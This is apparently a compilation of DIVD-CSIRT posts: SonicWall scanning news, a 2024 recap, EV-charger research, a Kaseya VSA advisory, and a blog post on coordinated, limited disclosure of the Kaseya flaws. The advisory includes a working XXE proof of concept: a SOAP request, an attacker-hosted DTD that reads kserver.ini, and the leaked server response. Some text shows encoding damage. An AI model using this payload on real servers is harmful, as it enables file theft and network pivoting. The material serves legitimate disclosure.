  🚨 𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 𝐦𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐯𝐮𝐥𝐧𝐞𝐫𝐚𝐛𝐢𝐥𝐢𝐭𝐢𝐞𝐬 𝐢𝐧 𝐒𝐨𝐧𝐢𝐜𝐖𝐚𝐥𝐥 𝐒𝐒𝐋𝐕𝐏𝐍
  Researchers from [Computest](https://nl.linkedin.com/company/computest?trk=organization_guest_main-feed-card-text) found multiple vulnerabilities in SonicWall SSLVPN functionality that made it possible to take over established SSLVPN sessions and potentially access the internal company network which contains sensitive data.
  The vulnerabilities were reported, and SonicWall has made a patch available. However, there is still a risk that cybercriminals will try to gain access to the remaining devices that haven’t been patched yet. Among the four vulnerabilities detailed in the security advisory, two (CVE-2024-53704 and CVE-2024-40762) are detectable through scans on the public internet.
  In collaboration with [Thijs Alkemade](https://nl.linkedin.com/in/thijs-alkemade?trk=organization_guest_main-feed-card-text) (Computest), DIVD-CSIRT has developed a fingerprint to identify vulnerable instances. Currently, case lead [Alwin Warringa](https://nl.linkedin.com/in/alwinwarringa?trk=organization_guest_main-feed-card-text) (DIVD) and DIVD researchers are scanning the public web for unpatched systems. Network owners with unpatched systems will be notified as quickly as possible.
  🤝 We would like to do a big shoutout to [Computest](https://nl.linkedin.com/company/computest?trk=organization_guest_main-feed-card-text) for contacting us soon after their discovery. This is how we keep the digital world safe, together!

  2024 was an amazing year for us! We celebrated our fifth anniversary with our incredible partners and volunteers—it was a moment we’ll never forget. On top of that, we kicked off 21 new collaborations and welcomed 55 enthusiastic new volunteers to the team.
  When we look at the numbers, they’ve gone up compared to previous years. Breaking records isn’t always great, but for us, it means we’re making a bigger impact year after year.
  A huge thank you to everyone who supported us in 2024. We can’t wait for 2025—it’s going to be an incredible year with so much in store.

  In our most recent research into the security of EV chargers, 17 new vulnerabilities (zero days) were discovered in chargers manufactured by [Iocharger](https://cn.linkedin.com/company/iocharger?trk=organization_guest_main-feed-card-text). These vulnerabilities were present in all AC-models of iocharger. The research was conducted by external researcher [Wilco van Beijnum](https://nl.linkedin.com/in/wilco-van-beijnum?trk=organization_guest_main-feed-card-text) and DIVD researcher [Harm van den Brink](https://nl.linkedin.com/in/harm-van-den-brink-ba1a1143?trk=organization_guest_main-feed-card-text).
  The identified vulnerabilities could have allowed cybercriminals to take control of all chargers from this manufacturer, potentially destabilizing the power grid. Sixteen of the 17 vulnerabilities have now been resolved and disclosed in close collaboration with the manufacturer.

## Description

The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker. Detailed description Given the following request: `POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 192.168.1.194:18081 Content-Length: 406 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:kas="KaseyaWS"> <soapenv:Header/> <soapenv:Body> <kas:PrimitiveResetPassword> <!--type: string--> <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM "http://192.168.1.170:8080/oob.dtd"><data>&send;</data>]]> </kas:XmlRequest> </kas:PrimitiveResetPassword> </soapenv:Body> </soapenv:Envelope>` And the following XML file hosted at http://192.168.1.170/oob.dtd: `<!ENTITY % file SYSTEM "file://c:\\kaseya\\kserver\\kserver.ini"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;` The server will fetch this XML file and process it, it will read the file c:\kaseya\kserver\kserver.ini and returns the content in the server response like below. Response: `HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/xml; charset=utf-8 Date: Fri, 02 Apr 2021 10:07:38 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 2677 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request. ---&gt; There is an error in XML document (24, -1000).\r\n\r\nSystem.Xml.XmlException: Fragment identifier '######################################################################## # This is the configuration file for the KServer. # Place it in the same directory as the KServer executable # A blank line or new valid section header [] terminates each section. # Comment lines start with ; or # ######################################################################## <snip>` Security issues discovered â \* The API insecurely resolves external XML entities \* The API has an overly verbose error response Impact â Using this vulnerability an attacker can read any file on the server the webserver process can read. Additionally, it can be used to perform HTTP(s) requests into the local network and thus use the Kaseya system to pivot into the local network.

## Solution(s)

Upgrade to version 9.5.6 or higher

# Kaseya VSA Limited Disclosure

07 Jul 2021 -
[Frank Breedijk](https://www.divd.nl/who-we-are/team/people/frank-breedijk/)

## Why we are only disclosing limited details on the Kaseya vulnerabilities

Last weekend we found ourselves in the middle of a storm. A storm created by the ransomware attacks executed via Kaseya VSA, using a vulnerability which we confidentially disclosed to Kaseya, together with six other vulnerabilities.

Ever since we released the news that we indeed notified Kaseya of a vulnerability used in the ransomware attack, we have been getting requests to release details about these vulnerabilities and the disclosure timeline. In line with the guidelines for [Coordinated Vulnerability Disclosure](https://english.ncsc.nl/publications/publications/2019/juni/01/coordinated-vulnerability-disclosure-the-guideline) we have not disclosed any details so far. And, while we feel it is time to be more open about this process and our decisions regarding this matter, we will still not release the full details.

## Why the secrecy?

As the ransomware attack using Kaseya VSA software has shown, the effects of a malicious actor knowing the full details of a vulnerability can be devastating. This immediately poses a dilemma to anybody that discovers a critical vulnerability in a critical piece of software, do we disclose the details or not?

Letâs use an analogy. Say a security researcher discovers a vulnerability in a high-end car. When you kick the left rear bumper in just the right way, the car doors open, and the engine starts. What should the researcher do? Tell everybody, tell all the owners of this type of car, or inform the manufacturer so he can recall and fix the car?

If the full details are made public, it is evident that many cars will get stolen very soon. If you inform the owners, this will likely happen too. The chances of the details remaining secret are slim if you inform a broad audience. Even if you limit the details to âa security issue involving the bumperâ, you might tip off the wrong people. Telling the manufacturer there is a good chance that he comes up with a fix before large-scale car thefts are happening, and consider if you need to tell the owners to keep their car behind closed doors in the meantime.

## How does this relate to Kaseya VSA?

When we discovered the vulnerabilities in early April, it was evident to us that we could not let these vulnerabilities fall into the wrong hands. After some deliberation, we decided that informing the vendor and awaiting the delivery of a patch was the right thing to do. We hypothesized that, in the wrong hands, these vulnerabilities could lead to the compromise of large numbers of computers managed by Kaseya VSA.

As we stated before, Kaseyaâs response to our disclosure has been on point and timely; unlike other vendors, we have previously disclosed vulnerabilities to. They listened to our findings, and addressed some of them by releasing a [patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021) resolving a number of these vulnerabilities. Followed by a [second patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021) resolving even more. Weâve been in contact with Kaseya ahead of the release of both these patches, allowing us to validate that these vulnerabilities had indeed been resolved by the patch in development.

Unfortunately, the worst-case scenario came true on Friday the 2nd of July. Kaseya VSA was used in an attack to spread ransomware, and Kaseya was compelled to use the nuclear option: shutting down their Kaseya Cloud and advising customers to turn off their on-premise Kaseya VSA servers. A message that unfortunately arrived too late for some of their customers.

We later learned that one of the two vulnerabilities used in the attack was one we previously disclosed to Kasya VSA.

## What can we tell?

In this blogpost and DIVD case [DIVD-2021-00011](https://csirt.divd.nl/DIVD-2021-00011/) we publish the timeline and limited details of the vulnerabilities we notified Kaseya of.

## Full disclosure?

Given the serious nature of these vulnerabilities and the obvious consequences of abuse of Kaseya VSA we will not disclose the full details of the vulnerabilities until such time that Kaseya has released a patch and this patch has been installed on a sufficient number of systems, something for which we have the monitoring scripts. In the past few days we have been working with Kaseya to make sure customers turn off their systems, by tipping them off about customers that still have systems online, and hope to be able to continue to work together to ensure that their patch is installed everywhere. We have no indication that Kaseya is hesitant to release a patch. Instead they are still working hard to make sure that after their patch the system is as secure as possible, to avoid a repeat of this scenario. Therefore we do not feel the need to lay down any kind of deadline for full disclosure at this point in time. A properly patched and secure Kaseya VSA is in the best interest of security of Kaseya customers and the internet at large.

## The vulnerabilities

We notified Kaseya of the following vulnerabilities:

* [CVE-2021-30116](https://csirt.divd.nl/cves/CVE-2021-30116) - A credentials leak and business logic flaw, resolution in progress.
